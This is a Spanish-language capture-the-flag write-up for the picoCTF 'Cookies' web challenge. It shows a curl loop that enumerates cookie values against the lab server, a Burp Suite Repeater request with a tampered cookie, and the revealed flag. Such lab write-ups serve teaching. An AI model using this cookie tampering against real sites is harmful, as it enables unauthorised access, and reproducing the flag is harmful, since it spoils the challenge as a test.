# Objetivo

¿A quién no le encantan las galletas? Intenta descubrir cuál es el mejor. http://mercury.picoctf.net:27177/
## Solución

Usaremos el editor de cookies para para corroborar que al ingresar el nombre de cookie en especifico pues cambia pero esta no es la correcta,  haremos uso del siguiente comando en la terminal, pues necesita de verificar las diferentes cookies que tiene:
```
┌──(jesus㉿KaliJesus)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep "I Love\|picoCTF"
```
Cuando llegue al indicado (donde encuentre `I Love` o `picoCTF`) se detiene para devolvernos la llave.

Otra forma es usando la herramienta `Burp Suite`, y vamos a encender el proxy pero no a interceptar, solamente vamos a ingresar la cookie que nos da de ejemplo y checamos el historial para verificar el que contenga en la sección `URL`, el texto : `/check`. Con click derecho, le vamos a la opción `Send to Repeater`
Buscamos la pestaña de `Repeater`, y nos encontramos con el siguiente código:

```
GET /check HTTP/1.1
Host: mercury.picoctf.net:27177
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://mercury.picoctf.net:27177/
Connection: close
Cookie: name=0
Upgrade-Insecure-Requests: 1
```
Cambiamos el nombre de la cookie, ingresamos el 18 y verificamos la respuesta:
```
           <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
        </div>

```
## Referencias

